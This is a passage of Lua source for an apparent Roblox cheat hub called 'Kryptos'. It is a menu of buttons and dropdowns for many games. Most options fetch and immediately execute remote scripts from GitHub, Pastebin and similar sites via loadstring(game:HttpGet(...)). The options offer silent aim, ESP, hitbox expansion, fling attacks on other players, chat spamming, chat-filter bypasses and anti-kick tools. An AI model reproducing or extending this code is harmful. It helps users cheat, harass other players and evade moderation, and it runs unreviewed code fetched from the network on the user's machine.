		elseif Value == "LB HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/RIVALS/main/Roblox"))()
		elseif Value == "Phantom HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/5oxin/Phantom/main/main"))()
		elseif Value == "RV HUB" then
			local scriptURL = 'https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/RivalsUPD2.lua'
			local response = game:HttpGet(scriptURL)
			local executeScript = loadstring(response)
			executeScript()
		elseif Value == "Rinns HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Rush Point",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"ESP",
		"Silent AIM"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(5993942214, game.Players.LocalPlayer)
		elseif Value == "ESP" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/AtomGotIce/Scripts/main/RushPoint%20Chams"))()
		elseif Value == "Silent AIM" then
			getgenv().Enabled = true
			getgenv().FOV = 100
			getgenv().Priority = 'Head'
			getgenv().HitPercentage = 100
			loadstring(syn.request({Url = 'https://raw.githubusercontent.com/WdUcdD1yVzQOOQpWTfLD/CIo6NEI8LHi65OhFuTCx/main/src.lua', Method = 'GET'}).Body)()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Ro Ghoul",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Zen HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(914010731, game.Players.LocalPlayer)
		elseif Value == "Zen HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Roghoul", true))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
}) --- S
--[] Seperator

GameHubTab:AddDropdown({
	Name = "South Bronx",
	Options = {
		"None",
		"Click to Join South Bronx",
		"1 (key: fdsawdfsiahjwudhyshauwhdhisuia)"
	},
	Callback = function(option)
		if option == "Click to Join South Bronx" then
			game:GetService("TeleportService"):Teleport(10179538382, game.Players.LocalPlayer)
		elseif option == "1 (key: fdsawdfsiahjwudhyshauwhdhisuia)" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/4drzy/fqfqfqfqffdsewfds/main/hhfdewfds"))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Steal time From Others",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Xyrez"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(10191847911, game.Players.LocalPlayer)
		elseif Value == "Xyrez" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/MaxicsSoft/XyrezAutoRank/main/StealTimeFromOthers.lua"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Sol's RNG",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"31tx HUB",
		"Hoho HUB",
		"LOLKING",
		"Sol's RNG | ERUDITE | HUB (BEST ONE)",
		"TTJY",
		"Xeo HUB",
		"key is :vy5fBGS6nNUuJjgxWhCLpR"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(15532962292, game.Players.LocalPlayer)
		elseif Value == "31tx HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Just3itx/Backup/main/loader.lua"))()
		elseif Value == "Hoho HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
		elseif Value == "LOLKING" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/era7/main/Sols"))()
		elseif Value == "Sol's RNG | ERUDITE | HUB (BEST ONE)" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/EruditeHub/main/Sol's%20RNG/V1.69"))()
		elseif Value == "TTJY" then
			getgenv().DiscordID = "id here"
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Yumiara/MainV2/main/niam.lua"))()
		elseif Value == "Xeo HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/MercyfulSmoked/Xeo/main/Main.lua'))()
		elseif Value == "key is :vy5fBGS6nNUuJjgxWhCLpR" then
			loadstring(game:HttpGet(('https://pastefy.app/55pnwOy3/raw'), true))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Shinobi STORM",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(4585085581, game.Players.LocalPlayer)
		elseif Value == "1" then
			loadstring(game:HttpGet("https://pastebin.com/raw/2RFgrskR"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Scythe Simulator",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"EPIC HUB (SUPPORT SOLARA)"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(17524285289, game.Players.LocalPlayer)
		elseif Value == "EPIC HUB (SUPPORT SOLARA)" then
			loadstring(game:HttpGet("https://scriptblox.com/raw/UPD-Scythe-Simulator-EPIC-HUB-Support-Solara-Now-WORKING-14384"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "SCP 3008",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Sky HUB",
		"Zygarde HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(2768379856, game.Players.LocalPlayer)
		elseif Value == "Sky HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
		elseif Value == "Zygarde HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Slap Battles",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Destroyer X",
		"SB HUB",
		"SB HUB That exists",
		"Slap Battles GUIS",
		"1"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(6403373529, game.Players.LocalPlayer)
		elseif Value == "Destroyer X" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Aquoupi/DestroyerX/main/DestroyerX"))()
		elseif Value == "SB HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
		elseif Value == "SB HUB That exists" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Battles"))()
		elseif Value == "Slap Battles GUIS" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Dusty1234567890/TestMain/main/SLAPBATTLESGUI5"))()
		elseif Value == "1" then
			loadstring(game:HttpGet("https://pastebin.com/raw/4XETajRm"))()
		end
	end
})


GameHubTab:AddDropdown({
	Name = "Sky Wars",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"Sky WARS"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(8542259458, game.Players.LocalPlayer)
		elseif Value == "Sky WARS" then
			loadstring(game:HttpGet("https://paste.ee/r/r9gnA", true))()
		end
	end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "The Strongest Battleground",
	Default = "None",
	Options = {
		"None",
		"Click to Join",
		"1",
		"Bedol HUB",
		"FFJ",
		"Hoho HUB",
		"Kade HUB",
		"Kavo",
		"Lightux HUB",
		"NS HUB",
		"Speed X HUB",
		"Statue HUB",
		"Zygarde HUB"
	},
	Callback = function(Value)
		if Value == "None" then
			print("")
		elseif Value == "Click to Join" then
			game:GetService("TeleportService"):Teleport(10449761463, game.Players.LocalPlayer)
		elseif Value == "Statue HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/idontknowwhattonamemyself/Statue-Hub/Lua/Main"))()
		elseif Value == "FFJ" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/TSBUtils.lua"))()
		elseif Value == "1" then
			local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/idontknowwhattonamemyself/a/Lua/Games"))()
			for i, v in pairs(a) do 
				if v == game.PlaceId or v == game.GameId then
					loadstring(game:HttpGet("https://raw.githubusercontent.com/idontknowwhattonamemyself/a/Lua/"..i))()
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "sub to icedpm",
				Text = "channel copied to ur clipboard",
			})
			setclipboard("https://www.youtube.com/@icedpm")
		elseif Value == "Kavo" then
			loadstring(game:HttpGet("https://pastebin.com/raw/pbhRRb2X"))()
		elseif Value == "Kade HUB" then
			getgenv().AutoReport = true
			if getgenv().KadeHubLoaded ~= true then
				getgenv().KadeHubLoaded = true
				loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/Work/main/latest.lua"))()
			else
				game.StarterGui:SetCore("SendNotification",  { Title = "KadeHub"; Text = "KadeHub is already executed!"; Icon = "rbxassetid://17893547380"; Duration = 15; })
			end
		elseif Value == "Bedol HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/TSBG.jsx"))()
		elseif Value == "Zygarde HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		elseif Value == "NS HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/HenSeu87PofghYT/ALL-IN-ONE/main/NSHUBV2"))()
		elseif Value == "Hoho HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
		elseif Value == "Lightux HUB" then
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md'),true))()
		elseif Value == "Speed X HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
		end
	end
})


--[] Kryptos | Universal

UniversalHubTab:AddParagraph("WARNING","Some of these might not work with your executor!")

--[] Seperator
local Section = UniversalHubTab:AddSection({
	Name = "Universal Hub [99+]"
})
--[] Seperator

UniversalHubTab:AddButton({
	Name = "Rochips V5 [99+]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Zm2VwbsU"))()
	end
})

--[] Seperator
local Section = UniversalHubTab:AddSection({
	Name = " Universal Hub [50+]"
})
--[] Seperator

UniversalHubTab:AddButton({
	Name = "Skyhub [50+]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
	end
})

UniversalHubTab:AddButton({
	Name = "Unfair Hub [50+]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
	end
})

--[] Seperator
local Section = UniversalHubTab:AddSection({
	Name = "Universal Hub [15+]"
})
--[] Seperator

UniversalHubTab:AddButton({
	Name = "Ender Hub [15+]",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/NovaExploits/NovaX-Key/main/Ender'))() 
	end
})

--[] Kryptos | Troll

--[] Seperator

TrollTab:AddParagraph("WARNING","Some of these might not work with your executor or game!")

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Classic"
})
--[] Seperator


TrollTab:AddButton({
	Name = "CoolKid Panel",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ckid", true))() 
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Universal Troll GUI"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Ultimate Trolling GUI [V1]",
	Callback = function()
		scriptnotfound()
	end
})

TrollTab:AddButton({
	Name = "Ultimate Trolling GUI [V2]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/UZPJ7jGs"))()
	end
})

TrollTab:AddButton({
	Name = "Ultimate Trolling GUI [V3]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Universal FE GUIS"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Universal FE GUI [1]",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
	end
})

TrollTab:AddButton({
	Name = "Universal FE GUI [2]",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'), true))()
	end
})

TrollTab:AddButton({
	Name = "Universal FE GUI [3]",
	Callback = function()
		loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Rochips-Panel-v4-13177'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Universal Troll Hubs"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Skyhub Trolling [2+]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Scripts"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Netless FE",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/pXWQxpLK'))()
	end
})

TrollTab:AddButton({
	Name = "Fling All FE",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
	end
})

TrollTab:AddButton({
	Name = "Fling Random FE",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/1FaK0DnK'))()
	end
})

TrollTab:AddButton({
	Name = "Touch Fling FE",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/544f7efbe88235666b5b7add65b7344d/raw/f20804bb85542dcc3bc938982e1f05b7ff05cded/FE%2520Hat%2520Fling'))()
	end
})	

TrollTab:AddButton({
	Name = "Click Fling FE",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
	end
})	

TrollTab:AddButton({
	Name = "ChatBOT FE",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua"))()
	end
})

TrollTab:AddButton({
	Name = "Orbit GUI FE",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI"))()
	end
})

TrollTab:AddButton({
	Name = "Giant Head FE",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/Dif6a2SK'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Anti's"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Anti Fling",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/h8sLkBP0"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Fling",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/tMHP76Ex"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Fling",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/DVJUMC9j"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Fling",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/DVJUMC9j"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Bang",
	Callback = function()
		loadstring(game:HttpGet('https://github.com/AnthonyIsntHere/anthonysrepository/raw/main/scripts/Anti%20Bang.lua'))()
	end
})

TrollTab:AddButton({
	Name = "Anti Tool Kill",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20Tool%20Kill.lua'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "No Dignity"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Sussy HUB FE",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub', true))()
	end
})

TrollTab:AddButton({
	Name = "Bang GUI FE",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Kryptos/main/BangGui.lua'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Message Spammer"
})
--[] Seperator



AutoMessageMessage = ''

TrollTab:AddParagraph("NOTE","Only works with new chat system will be fixed in the new version")

function AutoSpamFunc()
  while AutoSpam == true do
    task.wait(1)
     game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(AutoMessageMessage)
   end
end

TrollTab:AddToggle({
	Name = "Auto Spam",
	Default = false,
	Callback = function(Value)
		if Value == true then
		  AutoSpamFunc()
		else
		  AutoSpamFunc()
		end
	end    
})

TrollTab:AddTextbox({
	Name = "Auto Spam Message",
	Default = "Type message to spam",
	TextDisappear = false,
	Callback = function(Value)
		AutoMessageMessage = Value
	end	  
})

--[] Kryptos | Server

ServerTab:AddParagraph("WARNING","Some of these might not work because of your executor or game!")

--[] Seperator
local Section = ServerTab:AddSection({
	Name = "Kryptos ChatBypasser"
})
--[] Seperator



ServerTab:AddTextbox({
	Name = "Enter Message",
	Default = "KryptosBypasser!",
	TextDisappear = false,
	Callback = function(Value)
		TextBoxBypassMessage = Value
	end	  
})

ServerTab:AddButton({
  Name = "Send",
  Callback = function()
    SimpleBypass(TextBoxBypassMessage)
  end
})

ServerTab:AddButton({
  Name = "Anti-Chat Logger",
  Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua'))()
  end
})

--[] Seperator
local Section = ServerTab:AddSection({
	Name = "Chat bypass"
})
--[] Seperator

ServerTab:AddButton({
	Name = "SIMPLE Chat Bypasser",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
	end
})

ServerTab:AddButton({
	Name = "V3rge's Bypasser",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
	end
})

ServerTab:AddButton({
	Name = "BetterBypasser",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua", true))()
		Method = 3
		Keybind = "F"
		ShowMethodDictionary = true
	end
})

--[] Seperator
local Section = ServerTab:AddSection({
	Name = "Essentials [1]"
})
--[] Seperator

ServerTab:AddButton({
	Name = "Server Stat Icons",
	Callback = function()
		local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
		module:Teleport(game.PlaceId)
	end
})

ServerTab:AddButton({
	Name = "Server HOP",
	Callback = function()
		local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
		module:Teleport(game.PlaceId)
	end
})

ServerTab:AddButton({
	Name = "Server Auto Rejoin",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/9fYwjt6n"))()
	end
})

ServerTab:AddButton({
	Name = "Server Rejoin",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
	end
})

ServerTab:AddButton({
	Name = "Server Kick",
	Callback = function()
		game:GetService("Players").LocalPlayer:Kick("Kicked by Kryptos")
	end
})

ServerTab:AddButton({
	Name = "Server Join Smallest Server",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/QQMDVUHL"))() 
	end
})

--[] Seperator
local Section = ServerTab:AddSection({
	Name = "Essentials [2]"
})
--[] Seperator

ServerTab:AddButton({
	Name = "Anti AFK V1",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
	end
})

ServerTab:AddButton({
	Name = "Anti Kick",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
	end
})

--[] Kryptos | Admin

AdminTab:AddParagraph("NOTE","Found a admin script? tell us about it on our discord!")

--[] Seperator
local Section = AdminTab:AddSection({
	Name = "Admin"
})
--[] Seperator

AdminTab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/script/Infinite%20Yield.txt"))()
	end    
})

AdminTab:AddButton({
	Name = "Infinite Yield Secure",
	Callback = function()
		loadstring(game:HttpGet("https://github.com/ionlyusegithubformcmods/1-Line-Scripts/raw/main/Infinite%20Yield%20but%20with%20secure%20dex"))()
	end    
})


AdminTab:AddButton({
	Name = "Fate's Admin",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end    
})

AdminTab:AddButton({
	Name = "CMD-X",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end    
})

AdminTab:AddButton({
	Name = "Nameless",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
	end    
})

AdminTab:AddButton({
	Name = "Proton",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/HuT90Wbu"))()
	end    
})

AdminTab:AddButton({
	Name = "Reviz",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/ibFPdiF7'))()
	end    
})

AdminTab:AddButton({
	Name = "Shattervast",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/iL4NRDux'))()
	end    
})

AdminTab:AddButton({
	Name = "Homebrew",
	Callback = function()
		_G.CustomUI = false
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'), true))()
	end    
})

AdminTab:AddButton({
	Name = "Homebrew Custom UI",
	Callback = function()
		_G.CustomUI = true
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'), true))()
	end    
})

AdminTab:AddButton({
	Name = "QuirkyCMD",
	Callback = function()
    loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
	end    
})

--[] Seperator
local Section = AdminTab:AddSection({
	Name = "Chat Admin"
})
--[] Seperator

AdminTab:AddButton({
	Name = "Simple Chat Admin !",
	Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Ta153Q07"))()
	end    
})

AdminTab:AddButton({
	Name = "Simple Chat Admin .",
	Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Dn5ihVgH"))()
	end    
})



--[] Kryptos | Player

PlayerTab:AddParagraph("WARNING","Be carefull to not press anything that u dont want!")

PlayerTab:AddButton({
	Name = "Reset Player",
	Callback = function()
		forceResetAction()
	end    
})

PlayerTab:AddButton({
	Name = "Create Reset Player Button",
	Callback = function()

	  CreateIcon("rbxassetid://7734058599").MouseButton1Click:Connect(function()
	    forceResetAction()
	   end)
	end    
})


--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Player Tools"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "TP Tool",
	Callback = function()
		mouse = game.Players.LocalPlayer:GetMouse()
		tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = "Tp Tool"
		tool.Activated:connect(function()
			local pos = mouse.Hit + Vector3.new(0, 2.5, 0)
			pos = CFrame.new(pos.X, pos.Y, pos.Z)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		end)
		tool.Parent = game.Players.LocalPlayer.Backpack
	end
})

PlayerTab:AddButton({
	Name = "BTools",
	Callback = function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
	end    
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Character Scripts"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Anti-AFK",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
	end    
})

PlayerTab:AddButton({
	Name = "Fly V3",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/bHa6HDFc'))()
	end
})	

PlayerTab:AddButton({
	Name = "Shiftlock",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))()
	end
})

PlayerTab:AddButton({
	Name = "FullBright",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/xVrJdCn2"))
	end    
})

PlayerTab:AddButton({
	Name = "Hit-Box Expander",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/ajhFdr2Z'))()
	end
})	

PlayerTab:AddButton({
	Name = "X-ray",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/tweN2ysU"))()
	end
})	

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Teleport"
})
--[] Seperator

local playerNames = {}

for _, player in pairs(game.Players:GetPlayers()) do
    table.insert(playerNames, player.Name)
end

local selectedPlayerName = nil

local PlayerDropdown = PlayerTab:AddDropdown({
    Name = "Player Names",
    Default = playerNames[1] or "None",
    Options = playerNames,
    Callback = function(selectedName)
        selectedPlayerName = selectedName
    end    
})

local function updatePlayerNames()
    playerNames = {}
    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    PlayerDropdown:Refresh(playerNames, true)
end

game.Players.PlayerAdded:Connect(updatePlayerNames)
game.Players.PlayerRemoving:Connect(updatePlayerNames)

PlayerTab:AddButton({
    Name = "Teleport",
    Callback = function()
        if selectedPlayerName then
            local localPlayer = game.Players.LocalPlayer
            local targetPlayer = game.Players:FindFirstChild(selectedPlayerName)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    print("Teleported to " .. selectedPlayerName)
                end
            end
        else
            print("No player selected for teleportation")
        end
    end    
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "ESP"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Lightnux ESP",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md'))()
  end
})

PlayerTab:AddButton({
	Name = "Unnamed ESP",
	Callback = function()
	  pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))() end)
  end
})

PlayerTab:AddButton({
	Name = "ESP Refresh",
	Callback = function()
	  _G.ESPVisible = true
    Esp()
    _G.ESPVisible = false
    Esp()
  end
})

PlayerTab:AddToggle({
	Name = "ESP Visible",
	Default = false,
	Callback = function(Value)
		if Value == true then
		  _G.ESPVisible = true
		  Esp()
		  else
		    _G.ESPVisible = false
		    Esp()
		end
	end    
})


--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Crosshair"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Refresh Crosshair",
	Callback = function()
		Crosshair()
	end    
})

PlayerTab:AddButton({
	Name = "Turn On Crosshair",
	Callback = function()
		_G.CrosshairVisible = true
		Crosshair()
	end    
})

PlayerTab:AddButton({
	Name = "Turn Off Crosshair",
	Callback = function()
		_G.CrosshairVisible = false
		Crosshair()
	end    
})

PlayerTab:AddButton({
	Name = "Create Crosshair Button",
	Callback = function()
		CreateIcon("rbxassetid://7733765307").MouseButton1Click:Connect(function()
	    if _G.CrosshairVisible == false then
	      Crosshair()
	      _G.CrosshairVisible = true
	     else
	       Crosshair()
	      _G.CrosshairVisible = false
	     end
	   end)
	end    
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Character Preset"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Reset Character",
	Callback = function()
		forceResetAction()
	end    
})

PlayerTab:AddButton({
	Name = "Super Human",
	Callback = function()
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 50
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 100
	end    
})

PlayerTab:AddButton({
	Name = "Super Human++",
	Callback = function()
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 100
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 200
	end    
})

PlayerTab:AddButton({
	Name = "Slow RocketShip",
	Callback = function()
		game.workspace.Gravity = 1
	end    
})

PlayerTab:AddButton({
	Name = "God",
	Callback = function()
		loadstring(game:HttpGet("https://freenote.biz/raw/Fhpx5r5A8M"))()
	end
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Character Settings"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Unlock 3rd Person",
	Callback = function()
	  game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = 99999
	  game:GetService("Players").LocalPlayer.CameraMode = Enum.CameraMode.Classic
	end    
})

local Noclipping = nil
PlayerTab:AddToggle({
